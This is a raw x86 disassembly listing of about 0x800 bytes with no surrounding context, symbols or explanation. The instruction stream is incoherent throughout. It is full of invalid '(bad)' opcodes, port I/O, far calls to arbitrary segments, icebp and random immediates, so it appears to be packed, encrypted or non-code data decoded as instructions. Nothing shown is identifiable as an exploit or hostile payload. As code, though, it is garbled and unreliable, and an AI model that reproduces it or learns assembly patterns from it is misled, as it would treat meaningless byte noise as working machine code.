  414e41:	and    ebx,ebx
  414e43:	lea    ecx,[ecx]
  414e45:	fisttp WORD PTR [ebx+0x2a]
  414e48:	cmp    BYTE PTR [bx-0x4d1d],0xc1
  414e4e:	rcr    DWORD PTR [ebp+0x70],cl
  414e51:	xchg   esi,eax
  414e52:	je     0x414ed3
  414e54:	into   
  414e55:	daa    
  414e56:	pusha  
  414e57:	inc    esp
  414e58:	jmp    0x414e34
  414e5a:	ja     0x414de7
  414e5c:	jge    0x414e14
  414e5e:	and    esp,DWORD PTR [ecx-0x6b]
  414e61:	xor    DWORD PTR [ecx+0x67349d3b],edi
  414e67:	adc    eax,0xdc2b63e4
  414e6c:	in     eax,0xf1
  414e6e:	or     eax,0xeb251eb1
  414e73:	inc    esi
  414e74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e75:	jmp    DWORD PTR [ecx-0x71]
  414e78:	pop    esi
  414e79:	and    esp,DWORD PTR ds:0x675902f0
  414e7f:	lods   al,BYTE PTR ds:[esi]
  414e80:	xchg   BYTE PTR [eax+0xbf5d0d],bl
  414e86:	and    al,0x30
  414e88:	sub    DWORD PTR ds:0x810a1441,ebp
  414e8e:	stc    
  414e8f:	ja     0x414e2b
  414e91:	addr16 dec ebx
  414e93:	out    0xfa,eax
  414e95:	imul   ebp,DWORD PTR [edi+edx*2+0x5c],0xa1e417d
  414e9d:	mov    al,0xb7
  414e9f:	push   edi
  414ea0:	jl     0x414ee2
  414ea2:	ja     0x414e78
  414ea4:	dec    ebp
  414ea5:	push   ecx
  414ea6:	mov    esp,0x85fcc278
  414eab:	push   0xffffffdf
  414ead:	mov    ebx,0xc5920c55
  414eb2:	fs pop ebx
  414eb4:	pop    edi
  414eb5:	repz push cs
  414eb7:	(bad)  
  414eb8:	mov    ds:0x875d6fbd,eax
  414ebd:	sub    dh,BYTE PTR [eax-0x264f67f]
  414ec3:	test   BYTE PTR [eax+0x75],cl
  414ec6:	repnz or ebx,ebp
  414ec9:	in     al,0x24
  414ecb:	daa    
  414ecc:	inc    esp
  414ecd:	xchg   ecx,eax
  414ece:	push   esp
  414ecf:	int    0xdf
  414ed1:	cmp    BYTE PTR [edi],bh
  414ed3:	add    BYTE PTR [ebx+0x2dde9e34],bh
  414ed9:	mov    WORD PTR [ecx-0xe22f06d],cs
  414edf:	jae    0x414f15
  414ee1:	mov    BYTE PTR ds:0xf62a8cce,cl
  414ee7:	fisttp WORD PTR [edx+0x26f74f73]
  414eed:	sbb    ebx,DWORD PTR [ebp+ecx*1-0xa9b96bc]
  414ef4:	sbb    eax,DWORD PTR [eax]
  414ef6:	stos   DWORD PTR es:[edi],eax
  414ef7:	retf   0x4303
  414efa:	mov    ds:0xdfda43ae,eax
  414eff:	(bad)  
  414f00:	sbb    al,ah
  414f02:	fimul  WORD PTR [edx+edx*2+0x7088db98]
  414f09:	sub    eax,0xb72ea9fa
  414f0e:	outs   dx,DWORD PTR ds:[esi]
  414f0f:	dec    edi
  414f10:	imul   ecx,DWORD PTR [esp+eiz*4+0x2e09ab8b],0x59
  414f18:	addr16 fcom DWORD PTR [bx+di]
  414f1c:	fstp   DWORD PTR [eax+0x39d37625]
  414f22:	stos   BYTE PTR es:[edi],al
  414f23:	mov    DWORD PTR ds:0xb0b698a2,esp
  414f29:	ins    BYTE PTR es:[edi],dx
  414f2a:	add    al,0xbf
  414f2c:	add    DWORD PTR es:[esp+edi*4+0x67c8e70f],0x258019fe
  414f38:	push   edx
  414f39:	dec    esp
  414f3a:	cmp    esp,edi
  414f3c:	(bad)  
  414f3d:	mov    al,0xa1
  414f3f:	or     dl,BYTE PTR [eax-0x6008ddcc]
  414f45:	add    ebx,DWORD PTR [edx+0x8]
  414f48:	xor    al,dl
  414f4a:	dec    esi
  414f4b:	inc    edi
  414f4c:	fnstenv [edi-0x422d1317]
  414f52:	mov    edi,0xa45d94dd
  414f57:	test   eax,0xb77470de
  414f5c:	adc    DWORD PTR [ebp+0x69f8d820],esp
  414f62:	ins    DWORD PTR es:[edi],dx
  414f63:	add    dh,dh
  414f65:	jg     0x414fc7
  414f67:	inc    edi
  414f68:	nop
  414f69:	lods   eax,DWORD PTR ds:[esi]
  414f6a:	imul   esp,DWORD PTR [edx-0x2e],0x19
  414f6e:	lods   eax,DWORD PTR ds:[esi]
  414f6f:	icebp  
  414f70:	xor    al,0x33
  414f72:	adc    bl,BYTE PTR [esp+ebx*8-0x127e867b]
  414f79:	sub    ch,BYTE PTR [esi-0x341733ac]
  414f7f:	pop    ecx
  414f80:	cmp    al,0x6c
  414f82:	ss and esi,ebp
  414f85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f86:	shl    edi,cl
  414f88:	sub    eax,0x233393e9
  414f8d:	adc    eax,DWORD PTR [ebx+0x79d500ea]
  414f93:	add    BYTE PTR [edi+0x4b246f62],0xd4
  414f9a:	cmp    BYTE PTR [edi+0x2a],0x27
  414f9e:	les    ebp,FWORD PTR ds:0x5c9c64b1
  414fa4:	pop    es
  414fa5:	add    al,0x19
  414fa7:	leave  
  414fa8:	int3   
  414fa9:	and    dl,bl
  414fab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fac:	jns    0x414f80
  414fae:	sub    edi,esp
  414fb0:	jmp    0x414f3d
  414fb2:	lods   eax,DWORD PTR ds:[esi]
  414fb3:	pop    esp
  414fb4:	and    al,0x2d
  414fb6:	test   al,0x6c
  414fb8:	adc    al,0xba
  414fba:	gs add dh,ch
  414fbd:	mov    esp,0x7c3ede9
  414fc2:	fld    DWORD PTR [edi+0x437e6edd]
  414fc8:	dec    edi
  414fc9:	sbb    eax,0x2121fb2f
  414fce:	xlat   BYTE PTR ds:[ebx]
  414fcf:	scas   al,BYTE PTR es:[edi]
  414fd0:	jne    0x414fc9
  414fd2:	jo     0x414f76
  414fd4:	inc    esp
  414fd5:	pop    esi
  414fd6:	hlt    
  414fd7:	add    al,ch
  414fd9:	cmp    ah,BYTE PTR [esi-0x3aaefcf3]
  414fdf:	cmc    
  414fe0:	add    al,0xa0
  414fe2:	inc    eax
  414fe3:	sbb    DWORD PTR [ebx+0x6ad33f67],edx
  414fe9:	je     0x414fec
  414feb:	cmp    ebp,DWORD PTR [edx+0x38]
  414fee:	cmp    DWORD PTR [ecx+0x276cf7e9],0x1b
  414ff5:	popa   
  414ff6:	xchg   edx,eax
  414ff7:	aam    0x7d
  414ff9:	mov    dl,0xd5
  414ffb:	aas    
  414ffc:	adc    esp,ebx
  414ffe:	xor    eax,DWORD PTR [edx+0x74]
  415001:	sahf   
  415002:	aam    0xe9
  415004:	retf   0x60cb
  415007:	pop    edi
  415008:	jl     0x414faa
  41500a:	pop    ds
  41500b:	dec    edx
  41500c:	mov    eax,0x9a5dec1f
  415011:	mov    edi,0x4910f8ba
  415016:	leave  
  415017:	loopne 0x414fdd
  415019:	lds    eax,FWORD PTR [ebx+ebx*4-0x5da904a6]
  415020:	call   0x55be:0xd7b814b3
  415027:	(bad)  
  415028:	jo     0x415042
  41502a:	or     DWORD PTR [eax-0x3b],0xffffffdb
  41502e:	lock sub BYTE PTR [ebx-0x2c1dff7],ch
  415035:	les    ecx,FWORD PTR [esi-0x7aa7b7ce]
  41503b:	xchg   BYTE PTR [edx-0xbf39109],ch
  415041:	je     0x41508a
  415043:	mov    ch,0xfc
  415045:	sar    DWORD PTR [ebx+eiz*1+0x21cde57e],1
  41504c:	div    BYTE PTR [esi+0x1f5d2991]
  415052:	mov    ds:0xf57caf5,al
  415057:	das    
  415058:	sbb    edx,eax
  41505a:	pop    ebx
  41505b:	daa    
  41505c:	pop    ebp
  41505d:	test   BYTE PTR [edx-0x6],dh
  415060:	mov    edi,0x3d9022ad
  415065:	mov    esi,0x757de45
  41506a:	push   0xd81c5ff8
  41506f:	es inc ecx
  415071:	jb     0x414ff3
  415073:	xchg   DWORD PTR [esi-0x4273b46c],ebp
  415079:	daa    
  41507a:	repz mov ch,0xef
  41507d:	and    al,0x91
  41507f:	push   esi
  415080:	adc    al,0xc1
  415082:	imul   ebp,DWORD PTR [esi+0x7f9d7da8],0xd95621c6
  41508c:	daa    
  41508d:	or     bl,0x22
  415090:	jle    0x4150ca
  415092:	fsub   QWORD PTR [eiz*8+0x2ff8083f]
  415099:	stos   DWORD PTR es:[edi],eax
  41509a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41509b:	ins    DWORD PTR es:[edi],dx
  41509c:	add    edi,DWORD PTR [esi+0x29]
  41509f:	xor    BYTE PTR [edx],dh
  4150a1:	push   eax
  4150a2:	push   0xffffff89
  4150a4:	ror    BYTE PTR [esi+0x40],cl
  4150a7:	adc    edi,DWORD PTR [eax]
  4150a9:	in     al,0x39
  4150ab:	pop    es
  4150ac:	cli    
  4150ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150ae:	sub    eax,0xbe6cc567
  4150b3:	cmp    al,0x68
  4150b5:	sub    eax,0xd7d42049
  4150ba:	mov    ds:0xde7bba7b,eax
  4150bf:	mov    esi,0x65f645f9
  4150c4:	xchg   ebp,eax
  4150c5:	test   eax,0xe3bf8e3d
  4150ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150cb:	int3   
  4150cc:	aaa    
  4150cd:	repz pop ds
  4150cf:	(bad)  
  4150d0:	sub    al,0xcb
  4150d2:	push   ds
  4150d3:	cmp    DWORD PTR [eax-0x16],0x4b6b342a
  4150da:	ja     0x41510d
  4150dc:	xchg   edi,eax
  4150dd:	jg     0x415080
  4150df:	push   es
  4150e0:	jmp    0x6d66:0x55e325cd
  4150e7:	mov    dl,0x6e
  4150e9:	xor    bh,BYTE PTR [edx]
  4150eb:	aam    0xd
  4150ed:	lods   al,BYTE PTR ds:[esi]
  4150ee:	rcl    ebp,0xe4
  4150f1:	mov    eax,ds:0x2b6148e1
  4150f6:	mov    ?,WORD PTR [edi-0x53]
  4150f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150fa:	cmp    DWORD PTR [edx-0x20],ecx
  4150fd:	arpl   WORD PTR [esi-0x7e],dx
  415100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415101:	mov    eax,0x49769d1e
  415106:	inc    ebp
  415107:	add    dh,dh
  415109:	dec    ebx
  41510a:	pop    edi
  41510b:	imul   ecx,DWORD PTR [ebx+0x5e4197c5],0xffffffce
  415112:	cmp    ebp,DWORD PTR [edx-0x19]
  415115:	sar    BYTE PTR ds:0x3d8132f6,cl
  41511b:	or     eax,0x39b8111b
  415120:	and    ch,dh
  415122:	sbb    eax,0x39ef3d76
  415127:	adc    al,BYTE PTR [edx]
  415129:	int3   
  41512a:	loope  0x4150dc
  41512c:	sbb    DWORD PTR [ecx-0xd878735],0xfffffff7
  415133:	sbb    ch,ah
  415135:	xor    al,0xf6
  415137:	test   BYTE PTR fs:[eax+0x54932b83],dl
  41513e:	jb     0x41514c
  415140:	mov    ds:0xb75db97e,eax
  415145:	lea    eax,[edx]
  415147:	das    
  415148:	loope  0x4151a3
  41514a:	inc    edi
  41514b:	xor    dh,BYTE PTR ds:0xad2eb219
  415151:	jge    0x41516b
  415153:	outs   dx,BYTE PTR ds:[esi]
  415154:	mov    eax,ds:0x40be194d
  415159:	fdivr  st,st(6)
  41515b:	push   0x98b497bc
  415160:	adc    dh,BYTE PTR [esi+eax*2]
  415163:	inc    edi
  415164:	shl    DWORD PTR [edx],0x23
  415167:	xchg   ebx,eax
  415168:	push   0x90bfc5a7
  41516d:	push   ebp
  41516e:	sbb    BYTE PTR [ebx],dl
  415170:	retf   
  415171:	scas   al,BYTE PTR es:[edi]
  415172:	pop    esi
  415173:	std    
  415174:	int    0xdc
  415176:	add    eax,ebx
  415178:	rcl    DWORD PTR [ebx+0x45614031],cl
  41517e:	popf   
  41517f:	add    eax,0xf9dc5e5e
  415184:	inc    esp
  415185:	and    DWORD PTR cs:[eax-0xb3b913f],ecx
  41518c:	mov    ah,0x8d
  41518e:	out    0x84,eax
  415190:	push   cs
  415191:	jle    0x4151c9
  415193:	sbb    DWORD PTR [edi],0xffffff91
  415196:	dec    edi
  415197:	imul   edx,DWORD PTR [ecx+0x109aa6d2],0x64f23597
  4151a1:	loopne 0x4151a9
  4151a3:	in     eax,dx
  4151a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151a5:	scas   al,BYTE PTR es:[edi]
  4151a6:	sbb    eax,0xb3a9fc43
  4151ab:	push   edx
  4151ac:	stc    
  4151ad:	push   ss
  4151ae:	mov    ah,0x5b
  4151b0:	or     eax,0x8932a510
  4151b5:	adc    ch,bh
  4151b7:	mov    edx,0x150d4259
  4151bc:	add    ch,dh
  4151be:	push   ss
  4151bf:	(bad)  
  4151c1:	call   0x32b8:0xa33ddc5d
  4151c8:	mov    esi,cs
  4151ca:	xchg   DWORD PTR [eax],esi
  4151cc:	dec    edx
  4151cd:	hlt    
  4151ce:	sbb    eax,0x5665f6c1
  4151d3:	inc    edi
  4151d4:	mov    esi,0xae79e3fc
  4151d9:	and    ax,0x535f
  4151dd:	out    dx,eax
  4151de:	add    eax,0x8f9c7524
  4151e3:	pusha  
  4151e4:	mov    ch,0xcc
  4151e6:	retf   0x26e5
  4151e9:	imul   ecx,DWORD PTR [esi-0x4],0x72
  4151ed:	pop    ds
  4151ee:	aaa    
  4151ef:	mov    ch,0x93
  4151f1:	ror    ch,1
  4151f3:	xchg   edi,eax
  4151f4:	sub    al,0xaf
  4151f6:	xor    esp,DWORD PTR [ecx]
  4151f8:	repnz fnsave [ebx+0x37504b78]
  4151ff:	fcmovnb st,st(3)
  415201:	jg     0x415234
  415203:	inc    edi
  415204:	mov    ecx,0x27efc552
  415209:	test   eax,0xf72ffed8
  41520e:	repz xchg esi,eax
  415210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415211:	std    
  415212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415213:	(bad)  
  415214:	ss js  0x415225
  415217:	lds    ebx,FWORD PTR [edi+edi*4+0x183a9364]
  41521e:	out    dx,eax
  41521f:	inc    ebx
  415220:	int3   
  415221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415222:	(bad)  
  415223:	icebp  
  415224:	push   ecx
  415225:	bound  esp,QWORD PTR [ebp-0x7d0ef4b]
  41522b:	or     edx,DWORD PTR [esi-0x41425904]
  415231:	in     al,0x89
  415233:	clc    
  415234:	popa   
  415235:	sub    eax,0xce89da61
  41523a:	xlat   BYTE PTR ds:[ebx]
  41523b:	and    esi,DWORD PTR [eax-0x7707968d]
  415241:	enter  0x69d0,0xeb
  415245:	sub    ah,BYTE PTR [esi-0x4c3526ce]
  41524b:	sbb    eax,0xddb59cf3
  415250:	dec    edi
  415251:	xchg   ebx,eax
  415252:	test   DWORD PTR [edx+0x466f7902],0xaff3da3d
  41525c:	stos   BYTE PTR es:[edi],al
  41525d:	jne    0x4151ef
  41525f:	jne    0x415295
  415261:	sub    bl,0x8d
  415264:	or     ecx,DWORD PTR [edi-0x2c8c7c15]
  41526a:	sbb    eax,esp
  41526c:	push   ebx
  41526d:	div    ecx
  41526f:	xchg   esp,eax
  415270:	jmp    0x415201
  415272:	pop    ebx
  415273:	int    0x1d
  415275:	(bad)  
  415277:	in     eax,dx
  415278:	mov    esi,0xd8910111
  41527d:	scas   al,BYTE PTR es:[edi]
  41527e:	cwde   
  41527f:	mov    dh,bl
  415281:	cmp    al,BYTE PTR [ecx-0x294df8b2]
  415287:	lock fcomp DWORD PTR fs:[ebx+0x5e]
  41528c:	jo     0x4152d7
  41528e:	push   ebx
  41528f:	push   edi
  415290:	popf   
  415291:	inc    esi
  415292:	fiadd  WORD PTR [edi+0x79]
  415295:	inc    esp
  415296:	dec    edx
  415297:	pop    ebx
  415298:	fwait
  415299:	outs   dx,DWORD PTR ds:[esi]
  41529a:	sahf   
  41529b:	sbb    DWORD PTR fs:0x55999f40,ebp
  4152a2:	xor    BYTE PTR [esi+ebp*8+0x556edb95],bh
  4152a9:	or     eax,DWORD PTR [esi-0x12c0f045]
  4152af:	pop    edx
  4152b0:	jae    0x415270
  4152b2:	push   es
  4152b3:	out    0x7b,al
  4152b5:	add    DWORD PTR [edx+0x50642c56],edi
  4152bb:	dec    esi
  4152bc:	dec    ecx
  4152bd:	cld    
  4152be:	jmp    0x415274
  4152c0:	cmp    BYTE PTR [eax-0x72],dh
  4152c3:	fidivr WORD PTR [edx]
  4152c5:	add    cl,ch
  4152c7:	iret   
  4152c8:	int3   
  4152c9:	pop    ebp
  4152ca:	xchg   dl,ah
  4152cc:	push   ebp
  4152cd:	imul   esi,DWORD PTR [ebx-0x68],0xffffffa3
  4152d1:	cmp    BYTE PTR [ecx+0x453f585c],bl
  4152d7:	icebp  
  4152d8:	stc    
  4152d9:	inc    ebx
  4152da:	inc    ebp
  4152db:	xchg   ecx,eax
  4152dc:	call   0x274c3c18
  4152e1:	add    eax,0xbb6ac1ae
  4152e6:	sub    edi,edi
  4152e8:	sbb    eax,0xa3c537ec
  4152ed:	imul   ebp
  4152ef:	inc    edi
  4152f0:	mov    cl,0x67
  4152f2:	inc    ebx
  4152f3:	inc    DWORD PTR [ebx+0x4e]
  4152f6:	push   0x7b750298
  4152fb:	mov    WORD PTR [esi-0x191b002b],?
  415301:	iret   
  415302:	cmc    
  415303:	jg     0x4152a0
  415305:	icebp  
  415306:	pop    ss
  415307:	loopne 0x41528b
  415309:	xor    ebp,DWORD PTR [edx-0x1f]
  41530c:	out    dx,al
  41530d:	add    al,0x1e
  41530f:	repz or DWORD PTR [ebx],0xffffffce
  415313:	daa    
  415314:	sahf   
  415315:	xor    DWORD PTR [eax-0x4497b82d],ebp
  41531b:	sar    esi,1
  41531d:	jle    0x4152b6
  41531f:	test   DWORD PTR [eax+edi*4+0x68],0x29f6c301
  415327:	jne    0x415339
  415329:	jl     0x415383
  41532b:	inc    eax
  41532c:	adc    edi,DWORD PTR [esi]
  41532e:	ins    BYTE PTR es:[edi],dx
  41532f:	push   esi
  415330:	cmp    BYTE PTR [ebx+0x51],ch
  415333:	pop    eax
  415334:	push   ds
  415335:	mov    ds:0x1252d074,al
  41533a:	nop
  41533b:	xor    DWORD PTR [edx-0x6d],ebx
  41533e:	loop   0x41533c
  415340:	xor    BYTE PTR [edx+0x6e5f185a],ah
  415346:	jns    0x4152df
  415348:	xchg   edx,eax
  415349:	mov    bh,0x7
  41534b:	xor    ecx,DWORD PTR [eax+0x9]
  41534e:	gs int 0x6e
  415351:	sbb    esi,DWORD PTR [edi+0x6a9ed10]
  415357:	jmp    0xd813:0xd563afa8
  41535e:	xchg   edi,eax
  41535f:	mov    ds:0x7030b418,al
  415364:	inc    ebp
  415365:	scas   eax,DWORD PTR es:[edi]
  415366:	test   bl,dl
  415368:	imul   eax,DWORD PTR [edx],0x59
  41536b:	pop    edi
  41536c:	xchg   edx,eax
  41536d:	data16 add dl,BYTE PTR [edi+eax*2+0x15]
  415372:	(bad)  
  415373:	gs dec edx
  415375:	pop    ebp
  415376:	mov    bh,0x7c
  415378:	int3   
  415379:	pop    edx
  41537b:	jmp    0xf5568fcf
  415380:	pop    es
  415381:	test   DWORD PTR [ecx-0x36],ebx
  415384:	mov    ds:0x5e67b651,al
  415389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41538a:	sub    bh,dl
  41538c:	mov    DWORD PTR [eax-0x44],esi
  41538f:	mov    dh,0x37
  415391:	out    0xd6,al
  415393:	pop    ss
  415394:	fucom  st(7)
  415396:	dec    ecx
  415397:	sub    DWORD PTR [ecx-0x24f34158],edx
  41539d:	sub    eax,0x43211787
  4153a2:	fisubr WORD PTR [ebx]
  4153a4:	push   cs
  4153a5:	loope  0x415362
  4153a7:	xlat   BYTE PTR ds:[ebx]
  4153a8:	adc    eax,0x820b740f
  4153ad:	(bad)  
  4153ae:	pusha  
  4153af:	jmp    DWORD PTR [ecx+0x222eb9de]
  4153b5:	push   cs
  4153b6:	call   0x7508:0x992570bf
  4153bd:	sub    bl,BYTE PTR ds:[eax+0x3f257b0]
  4153c4:	lock fistp WORD PTR [eax]
  4153c7:	jg     0x41535f
  4153c9:	cdq    
  4153ca:	and    ah,al
  4153cc:	fimul  DWORD PTR [esi+0x32]
  4153cf:	out    dx,al
  4153d0:	mov    ds:0x5472bc5a,al
  4153d5:	loop   0x41537b
  4153d7:	pop    edx
  4153d8:	das    
  4153d9:	cwde   
  4153da:	mov    esp,0x12c649c0
  4153df:	ret    
  4153e0:	add    DWORD PTR cs:[edx+eiz*4+0x4e3712e9],ebx
  4153e8:	mov    WORD PTR [ebx+0x3e],gs
  4153eb:	and    esi,DWORD PTR [esi]
  4153ed:	into   
  4153ee:	ret    
  4153ef:	js     0x4153c0
  4153f1:	and    eax,0xabe82067
  4153f6:	addr16 jg 0x415424
  4153f9:	in     al,dx
  4153fa:	clc    
  4153fb:	iret   
  4153fc:	(bad)  
  4153fd:	mov    ds:0x122a5bcd,al
  415402:	mov    ebp,0x4f1bef3f
  415407:	dec    ebx
  415408:	jmp    0x45fbe0ca
  41540d:	mov    edx,0x48bc6ee1
  415412:	pusha  
  415413:	inc    ebx
  415414:	xchg   ebx,eax
  415415:	aaa    
  415416:	cmp    edi,ebx
  415418:	outs   dx,DWORD PTR ds:[esi]
  415419:	pop    ebx
  41541a:	xchg   edx,eax
  41541b:	loop   0x4153b7
  41541d:	xlat   BYTE PTR ds:[ebx]
  41541e:	jle    0x415490
  415420:	test   eax,0x2b6eafef
  415425:	pop    edx
  415426:	cmp    ah,BYTE PTR [edi]
  415428:	mov    bl,0xc0
  41542a:	and    eax,0xe7b4747f
  41542f:	mov    WORD PTR [ecx],?
  415431:	test   ebp,0xef5813dd
  415437:	scas   al,BYTE PTR es:[edi]
  415438:	mov    DWORD PTR [ebx+0x1d],esp
  41543b:	pop    es
  41543c:	cld    
  41543d:	je     0x41545d
  41543f:	jmp    0x41546c
  415441:	in     al,0xd3
  415443:	sub    eax,0xeadac7f3
  415448:	rcl    BYTE PTR [edi+0x6e],cl
  41544b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41544c:	lods   eax,DWORD PTR ds:[esi]
  41544d:	dec    edx
  41544e:	and    dl,cl
  415450:	push   esi
  415451:	call   0xdbe9:0x6f5ae175
  415458:	mov    bh,0x10
  41545a:	les    ebp,FWORD PTR [eax-0x354abeb1]
  415460:	leave  
  415461:	push   edx
  415462:	iret   
  415463:	ins    DWORD PTR es:[edi],dx
  415464:	add    al,0x76
  415466:	je     0x415487
  415468:	sbb    BYTE PTR [eax-0x3e60b3d8],bh
  41546e:	or     ebp,ecx
  415470:	(bad)  
  415471:	clc    
  415472:	push   edx
  415473:	push   edx
  415474:	mov    DWORD PTR [eax+0xdac3dc4],edi
  41547a:	pop    ss
  41547b:	dec    edi
  41547c:	pop    eax
  41547d:	cmp    edi,DWORD PTR [edi-0x699134ac]
  415483:	(bad)  
  415484:	push   ebp
  415485:	aam    0x8d
  415487:	loop   0x41548e
  415489:	pushf  
  41548a:	push   ss
  41548b:	(bad)  
  41548c:	repz sub BYTE PTR [esi+0x2a],bl
  415490:	sbb    al,0xae
  415492:	js     0x415432
  415494:	push   ss
  415495:	adc    edi,DWORD PTR [edi]
  415497:	cmp    DWORD PTR [ebx],edi
  415499:	gs mov cl,0x9d
  41549c:	(bad)  
  41549d:	xor    bh,dl
  41549f:	mov    esp,0xae3fba94
  4154a4:	sar    BYTE PTR [edx-0x9ff17df],0x14
  4154ab:	jo     0x4154bb
  4154ad:	fs pushf 
  4154af:	fistp  WORD PTR [edi-0x22]
  4154b2:	xor    DWORD PTR [ebx+0x63],0xfffffff8
  4154b6:	int3   
  4154b7:	mov    BYTE PTR [ebx],dh
  4154b9:	sub    al,0x90
  4154bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154bc:	inc    edi
  4154bd:	cmp    DWORD PTR [eax+edi*1-0x4df5242f],edx
  4154c4:	push   0xffffff82
  4154c6:	xchg   ebp,eax
  4154c7:	popa   
  4154c8:	rol    al,1
  4154ca:	dec    ebx
  4154cb:	stos   BYTE PTR es:[edi],al
  4154cc:	je     0x41545c
  4154ce:	or     DWORD PTR [edi+0x58],esp
  4154d1:	adc    DWORD PTR [eax],0xd5e2874d
  4154d7:	shl    DWORD PTR [ebp+0x20fd1821],1
  4154dd:	pop    ecx
  4154de:	cld    
  4154df:	and    bl,BYTE PTR [esi]
  4154e1:	idiv   DWORD PTR [eax]
  4154e3:	mov    al,ds:0xd5fc9d8b
  4154e8:	fimul  WORD PTR [eax+eiz*4+0x73]
  4154ec:	xor    esp,ecx
  4154ee:	jl     0x41553e
  4154f0:	pop    ds
  4154f1:	lahf   
  4154f2:	cmp    eax,0x8ce58409
  4154f7:	mov    ecx,0x23869551
  4154fc:	cdq    
  4154fd:	sub    DWORD PTR [ebx+0x22],0x7
  415501:	std    
  415502:	in     al,0x3f
  415504:	stos   BYTE PTR es:[edi],al
  415505:	les    edx,FWORD PTR [edx]
  415507:	push   edi
  415508:	sbb    al,0x52
  41550a:	fbstp  TBYTE PTR [ebx-0x4]
  41550d:	fs add eax,0xe41a0933
  415513:	repz clc 
  415515:	jl     0x415499
  415517:	mov    dl,0x9f
  415519:	inc    edi
  41551a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41551b:	push   ds
  41551c:	pop    esp
  41551d:	pop    es
  41551e:	out    dx,al
  41551f:	mov    ah,0x69
  415521:	loop   0x41553c
  415523:	call   0x5c91:0x5838e987
  41552a:	mov    dh,0x69
  41552c:	popf   
  41552d:	ror    BYTE PTR [edi],cl
  41552f:	pushf  
  415530:	leave  
  415531:	mov    ds:0xb2b4357b,eax
  415536:	retf   
  415537:	mov    BYTE PTR [edi],cl
  415539:	sar    edi,cl
  41553b:	xchg   BYTE PTR [edi+edx*8],ah
  41553e:	stc    
  41553f:	add    al,0x83
  415541:	pop    ecx
  415542:	int3   
  415543:	test   BYTE PTR [eax+0x22f79762],0x76
  41554a:	aas    
  41554b:	mov    ah,0x1a
  41554d:	arpl   WORD PTR [ebp+0x2f9df5dc],bx
  415553:	shr    DWORD PTR [ecx],1
  415555:	lods   eax,DWORD PTR ds:[esi]
  415556:	xchg   esi,eax
  415557:	sub    ebx,ebx
  415559:	test   al,0xfb
  41555b:	outs   dx,BYTE PTR fs:[esi]
  41555d:	mov    ebp,0x7717eb2b
  415562:	mov    dh,0x2f
  415564:	jno    0x4155d2
  415566:	push   ss
  415567:	ss inc eax
  415569:	fcmovne st,st(1)
  41556b:	and    edi,DWORD PTR [esi+0x51]
  41556e:	push   cs
  41556f:	add    DWORD PTR [esi+0x55],eax
  415572:	mov    dh,0x53
  415574:	jno    0x4155cd
  415576:	dec    esp
  415577:	loopne 0x4155d3
  415579:	popw   es
  41557b:	xchg   ebx,edx
  41557d:	jmp    0xf90acdd3
  415582:	int    0x1e
  415584:	into   
  415585:	and    DWORD PTR [eax+edx*2-0xa01b51c],0x6c99da80
  415590:	bnd ret 0xe9e3
  415594:	jne    0x415521
  415596:	daa    
  415597:	int    0x26
  415599:	jo     0x4155dc
  41559b:	cmp    dh,BYTE PTR [ecx]
  41559d:	fdiv   DWORD PTR [ebx+0x3]
  4155a0:	or     DWORD PTR [edx-0xa],0xffffffd8
  4155a4:	(bad)  
  4155a5:	mov    ebx,0x4e0865f5
  4155aa:	jge    0x415539
  4155ac:	or     al,0xf1
  4155ae:	popa   
  4155af:	(bad)  
  4155b0:	jns    0x415619
  4155b2:	rcl    BYTE PTR [ebx+0x31],0x7a
  4155b6:	cs inc eax
  4155b8:	(bad)  
  4155b9:	loope  0x4155b7
  4155bb:	jg     0x4155aa
  4155bd:	jmp    0xbac4:0xe19a0001
  4155c4:	mov    al,ds:0x79c0e32
  4155c9:	aas    
  4155ca:	mov    WORD PTR ds:0x5caf27fc,es
  4155d0:	inc    esp
  4155d1:	(bad)  [eax+0x63a0e669]
  4155d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155d8:	gs pushf 
  4155da:	mov    bl,0x86
  4155dc:	cmc    
  4155dd:	lock call 0x49eb:0x35800e7
  4155e5:	clc    
  4155e6:	add    ah,dh
  4155e8:	pop    ecx
  4155e9:	call   0xfd1:0x8f105907
  4155f0:	mov    ch,0xea
  4155f2:	fld    TBYTE PTR [edi-0x36b2050f]
  4155f8:	les    ebp,FWORD PTR [eax]
  4155fa:	pushf  
  4155fb:	dec    eax
  4155fc:	mov    esi,0xf535ca5b
  415601:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415602:	jb     0x415655
  415604:	xchg   esi,eax
  415605:	stos   DWORD PTR es:[edi],eax
  415606:	push   ecx
  415607:	in     eax,0x76
  415609:	imul   edi,esi,0x7e
  41560c:	ret    
  41560d:	add    BYTE PTR [esi-0x43257151],ch
  415613:	ins    DWORD PTR es:[edi],dx
  415614:	jge    0x4155db
  415616:	mov    ch,0x14
  415618:	inc    ebx
  415619:	add    al,0x62
  41561b:	xor    ah,BYTE PTR [edx]
  41561d:	inc    esp
  41561e:	fwait
  41561f:	retf   
  415620:	aas    
  415621:	jno    0x415671
  415623:	add    ecx,ebp
  415625:	xchg   ebx,eax
  415626:	xor    ah,BYTE PTR [ecx+0x51]
  415629:	push   ebp
  41562a:	outs   dx,BYTE PTR ds:[esi]
  41562b:	(bad)  
  41562d:	push   ds
  41562e:	mov    edi,0xe4f0cfdc
  415633:	(bad)  
  415634:	mov    ah,0x16
  415636:	ja     0x415689
  415638:	mov    ch,0xeb
  41563a:	mov    BYTE PTR [ecx+0x3eb48771],cl
  415640:	cmp    dl,dh
  415642:	jnp    0x4155f7
  415644:	adc    al,0x8f
